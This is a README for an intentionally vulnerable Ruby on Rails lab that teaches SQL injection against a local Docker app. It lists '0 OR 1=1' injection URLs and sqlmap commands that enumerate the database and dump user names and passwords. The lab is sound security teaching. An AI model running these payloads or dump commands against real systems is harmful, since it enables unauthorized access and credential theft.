# README

The project exposes some simple and some complicated vulnerabilities in Ruby on Rails.

Corresponding Slide deck: http://bit.ly/seckc-defend-app-takedown

# Requirements
Docker
Python
sqlmap - https://github.com/sqlmapproject/sqlmap#installation

# Getting Started

To get started, you will want to check out the project

# Running the project

## Docker
docker-compose up -d --build
docker-compose run vulnerable_rails bundle exec rake db:migrate db:seed

# Database
There is one table called users and it is prepoulated with the 100 random users via the db:seed command

# Available APIs

* injectable_users
  - by id
    - localhost:3000/injectable_users?id=0+OR+1=1
  - by first_name
    - localhost:3000/injectable_users?first_name=0+OR+1=1
* not_injectable_users 
  - by user_name
    - localhost:3000/not_injectable_users?user_name=0+OR+1=1
  - by last_name
    - localhost:3000/not_injectable_users?last_name=0+OR+1=1

# SQLMap Commands

```console
sqlmap -u http://localhost:3000/users\?id\=1 --dbs
sqlmap -u http://localhost:3000/users\?id\=1 -D secure_db --tables
sqlmap -u http://localhost:3000/users\?id\=1 -D secure_db -T users --columns
sqlmap -u http://localhost:3000/users\?id\=1 -D secure_db -T users -C user_name,password --dump
```
